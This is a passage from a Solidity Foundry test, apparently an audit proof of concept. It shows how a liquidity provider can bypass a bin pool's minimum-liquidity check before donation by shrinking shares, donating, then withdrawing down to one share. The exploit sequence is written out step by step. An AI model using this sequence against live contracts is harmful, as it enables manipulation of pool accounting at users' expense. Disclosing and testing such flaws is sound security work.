...
contract BinPoolDonateTest is BinTestHelper {
    ...
    /// @dev try: forge test --isolate --show-progress --match-test testDonate_BypassInsufficientLiqudiityToReceiveFee_ -vvv
    function testDonate_BypassInsufficientLiqudiityToReceiveFee_() public {
        // Initialize pool and add liqudiity
        poolManager.initialize(key, activeId, new bytes(0));
        addLiquidityToBin(key, poolManager, alice, activeId, 1e18, 1e18, 1e18, 1e18, "");

        // 1. make it exactly Constants.MIN_BIN_LIQUIDITY_BEFORE_DONATE shares
        uint256 aliceShare = poolManager.getPosition(poolId, alice, activeId, 0).share;
        removeLiquidityFromBin(
            key, poolManager, alice, activeId, aliceShare - Constants.MIN_BIN_LIQUIDITY_BEFORE_DONATE, ""
        );

        // 2. make it exactly 1 shares
        poolManager.donate(key, 1e18 * 1e6, 1e18 * 1e6, "");
        removeLiquidityFromBin(key, poolManager, alice, activeId, Constants.MIN_BIN_LIQUIDITY_BEFORE_DONATE - 1, "");

        // 3. we've bypassed MIN_BIN_LIQUIDITY_BEFORE_DONATE check
        // since delta generated by removing liquidity cancels out most part of delta generated by donate

        // 1000000000000000001  i.e. 1e18 + 1
        console2.log(vault.reservesOfApp(address(poolManager), key.currency0));
        // 1000000000000000001  i.e. 1e18 + 1
        console2.log(vault.reservesOfApp(address(poolManager), key.currency1));
